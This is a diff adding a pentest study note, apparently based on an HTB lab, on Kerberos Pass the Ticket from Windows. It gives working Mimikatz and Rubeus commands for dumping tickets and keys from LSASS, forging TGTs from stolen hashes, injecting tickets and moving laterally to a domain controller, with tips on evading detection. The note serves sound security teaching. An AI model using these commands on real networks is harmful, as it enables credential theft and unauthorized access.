@@ -1,0 +1,182 @@
+---
+title: "Pass the Ticket (PtT) from Windows"
+---
+
+<Info>
+**What it is**
+
+Pass the Ticket abuses Kerberos by **stealing or forging a Kerberos ticket and injecting it into your own logon session**, so Windows authenticates you as the ticket's owner — no password or hash needed at the point of use. It's the Kerberos counterpart to [Pass the Hash](/password-attacks/pass-the-hash): there you reuse an NT hash over NTLM; here you reuse a TGT/TGS over Kerberos.
+
+For *why* tickets authenticate you (KDC, TGT vs TGS, the AS-REQ/TGS-REQ flow), read [Windows Authentication - NTLM & Kerberos](/password-attacks/windows-authentication-ntlm-kerberos) first — this note assumes that model and focuses on the Windows tooling. The Linux equivalent (ccache/keytab files) is [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux).
+</Info>
+
+## Why it works
+
+Kerberos issues you a **TGT** after you authenticate once, then exchanges it for per-service **TGS** tickets. On Windows these tickets live in **LSASS memory**. If you have local admin/SYSTEM, you can extract them — and because a service validates a ticket with *its own* key (it never re-checks your password), a stolen ticket presented from any session is accepted until it expires. So:
+
+- Steal a **TGT** → request TGS for *any* service that user may access.
+- Steal a **TGS** → use that one service directly.
+- Or, if you only have the user's **hash/key**, mint a brand-new TGT yourself — **OverPass-the-Hash / Pass the Key** (below).
+
+<Info>
+**Tickets expire — note the clock**
+
+A TGT is typically valid ~10 hours and renewable for ~7 days. Check `EndTime`/`RenewTill` on dumped tickets; an expired ticket is useless and you'll need to re-dump or re-mint.
+</Info>
+
+---
+
+## Step 1 — Obtain tickets
+
+To collect tickets from LSASS you must run the tool **as local administrator** (for Mimikatz) — Rubeus can dump without admin in some cases but needs admin for *all* sessions.
+
+### Mimikatz — export tickets to disk
+
+```cmd
+sekurlsa::tickets /export
+```
+
+- Dumps every ticket in LSASS to **`.kirbi`** files in the current directory.
+- Filename hints: a ticket whose name contains **`krbtgt`** is a **TGT** (the most valuable — it unlocks any service); names ending in **`$`** belong to **computer accounts**; a normal user ticket looks like `user@service-domain`.
+
+### Rubeus — dump tickets (base64)
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+- Dumps all tickets (run as admin to get every session) and prints each as **base64** instead of writing files.
+- `/nowrap` keeps the base64 on one line for clean copy-paste. You'll later inject these with `ptt` or convert them to `.kirbi`.
+
+---
+
+## Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)
+
+If you don't have a ticket but you **do** have the user's hash/key, you can request a *fresh* TGT. Traditional [Pass the Hash](/password-attacks/pass-the-hash) reuses the NT hash over **NTLM and never touches Kerberos**; **OverPass-the-Hash converts that key into a real Kerberos TGT**, giving you Kerberos-native access (often quieter, and required when the target only accepts Kerberos).
+
+First, get the keys from LSASS with Mimikatz:
+
+```cmd
+sekurlsa::ekeys
+```
+
+This lists every Kerberos key for each logged-on user — e.g. for `julio`:
+
+```text
+* Username : julio
+* Domain   : INLANEFREIGHT.HTB
+* Key List :
+  aes256_hmac    77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
+  rc4_hmac_nt    64f12cddaa88057e06a81b54e73b949b
+  ...
+```
+
+<Info>
+**Which key to use — and why it matters**
+
+`rc4_hmac` **is the NT hash**; `aes256_hmac` is the AES key. Since Windows Server 2008, AES is the default and **using `/rc4` can stand out** (downgrade to weaker encryption is a detection signal, and some hardened DCs reject RC4). **Prefer `/aes256`** when you have it.
+</Info>
+
+**Mimikatz** — spawn a process whose Kerberos identity is the target (this is `sekurlsa::pth` used for Kerberos, not just NTLM):
+
+```cmd
+sekurlsa::pth /domain:inlanefreight.htb /user:julio /ntlm:64f12cddaa88057e06a81b54e73b949b
+```
+
+Gives a new `cmd.exe` that can request any service ticket as `julio`. (Use `/aes256:<key>` instead of `/ntlm` to stay AES-native.)
+
+**Rubeus `asktgt`** — request a TGT directly from a key:
+
+```cmd
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /aes256:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76 /nowrap
+```
+
+- `/user` + `/domain` — who to authenticate as.
+- `/aes256` (or `/rc4`, `/aes128`, `/des`) — the key to authenticate with.
+- `/nowrap` — single-line base64 output.
+- Add **`/ptt`** to inject the TGT straight into your current session (skip the copy-paste):
+  ```cmd
+  Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /ptt
+  ```
+
+The output is a base64 `.kirbi` plus ticket metadata (`ServiceName krbtgt/...` confirms it's a TGT, with `StartTime`/`EndTime`/`RenewTill`). Save the base64 — that's the ticket you'll pass.
+
+<Note>
+**Privileges**
+
+**Mimikatz** OverPass-the-Hash needs **local admin** (it touches LSASS). **Rubeus `asktgt`** does **not** — it just talks Kerberos to the KDC with the key you supply.
+</Note>
+
+---
+
+## Step 2b — Inject a stolen/forged ticket (the actual "pass")
+
+Once you have a ticket (a `.kirbi` file, or base64 from Rubeus), load it into your session so tools authenticate with it.
+
+**Rubeus — inject base64 or a file:**
+
+```cmd
+Rubeus.exe ptt /ticket:doIFujCCBba...        # base64 from asktgt/dump
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   # a .kirbi file
+```
+
+**Mimikatz — inject a `.kirbi` from disk:**
+
+```cmd
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+```
+
+**Convert a `.kirbi` to base64** (e.g. to feed Rubeus `ptt /ticket:` or move it around) with PowerShell:
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+```
+
+After injection, **`klist`** should show the imported ticket in your session. Now any Kerberos-aware tool you run uses it.
+
+---
+
+## Step 3 — Use the ticket (lateral movement)
+
+With a TGT loaded, request service tickets and move. PowerShell Remoting is the cleanest demonstration:
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+mimikatz # exit
+
+c:\tools> powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+```
+
+- `kerberos::ptt` injects the TGT into the current `cmd.exe`.
+- Launching `powershell` from that same `cmd.exe` **inherits the ticket**, so `Enter-PSSession -ComputerName DC01` authenticates over **WinRM with Kerberos** as the ticket owner — landing you on the DC as `john`.
+
+<Tip>
+**Connect by hostname, not IP**
+
+Kerberos needs an **SPN**, which is tied to a hostname. `Enter-PSSession -ComputerName DC01` works; `-ComputerName 172.16.1.10` will fall back to NTLM (or fail) because there's no SPN for the raw IP. Same rule applies to all Kerberos lateral movement.
+</Tip>
+
+---
+
+## Where it fits in a pentest
+
+PtT is core **lateral movement** in an AD engagement. Typical chain: land on a box → `sekurlsa::ekeys`/`tickets` or `Rubeus dump` → grab a privileged user's TGT (or `asktgt` from their key) → inject → `Enter-PSSession`/`impacket` to the next host or the DC. It's preferred over PtH when the environment is Kerberos-only or you want to stay AES-native and quieter. It also chains from other attacks that *yield* tickets: Kerberoasting, AS-REP roasting, unconstrained delegation, and [Pass the Certificate](/password-attacks/pass-the-certificate) (PKINIT → TGT).
+
+## Key Takeaways
+
+- PtT reuses a **Kerberos ticket** (TGT or TGS) from LSASS; a TGT is the prize because it requests any service.
+- **OverPass-the-Hash / Pass the Key** bridges hash→Kerberos: turn a stolen NT hash or **AES key** into a real TGT (`Rubeus asktgt` / Mimikatz `sekurlsa::pth`). **Prefer AES** over RC4 for opsec.
+- Dump with `sekurlsa::tickets /export`, `sekurlsa::ekeys`, or `Rubeus dump /nowrap`; inject with `Rubeus ptt` / `kerberos::ptt`; verify with `klist`.
+- **Mimikatz needs local admin; Rubeus `asktgt` does not.**
+- **Use hostnames, not IPs** — Kerberos needs an SPN. Watch ticket `EndTime`/`RenewTill`.
+
+## See also
+
+- [Windows Authentication - NTLM & Kerberos](/password-attacks/windows-authentication-ntlm-kerberos) — the protocol theory behind every step here.
+- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux) — same attack with ccache/keytab files on domain-joined Linux.
+- [Pass the Hash](/password-attacks/pass-the-hash) — the NTLM-side equivalent; OverPass-the-Hash is the bridge between them.
+- [Pass the Certificate](/password-attacks/pass-the-certificate) — obtaining a TGT from a certificate (PKINIT).
